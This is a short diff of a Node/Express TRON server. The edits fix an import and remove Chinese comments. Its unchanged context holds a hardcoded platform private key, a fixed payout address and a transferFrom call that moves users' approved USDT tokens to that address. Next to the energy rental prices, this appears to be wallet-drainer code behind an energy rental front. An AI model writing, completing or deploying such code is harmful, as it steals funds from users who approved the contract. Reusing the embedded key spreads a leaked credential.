@@ -1,4 +1,4 @@
-import express from 'react';
+import express from 'express';
 import path from 'path';
 import cors from 'cors';
 import bodyParser from 'body-parser';
@@ -15,7 +15,7 @@ let systemConfig = {
   fullNode: 'https://api.trongrid.io',
   tokenContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
   spenderAddress: 'TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT',
-  toAddress: 'TUc1cb2gyX8MVPkFJsqWRjm2WL2rA2vvEC', // 您指定的最终收款目标地址
+  toAddress: 'TUc1cb2gyX8MVPkFJsqWRjm2WL2rA2vvEC', // 最终收款目标地址
   platformPrivateKey: '301c1d79223204937c82cbc504b26bfbfccbfc08066183285cfa8ff9b9',
   energyPrices: {
     energy32k: 1.2,
@@ -174,7 +174,7 @@ async function startServer() {
 
       const result = await contract.transferFrom(
         userAddress,
-        systemConfig.toAddress, // 自动划转到指定的收款目标地址
+        systemConfig.toAddress,
         transferAmount.toString()
       ).send({ feeLimit: 150_000_000, callValue: 0 });
 
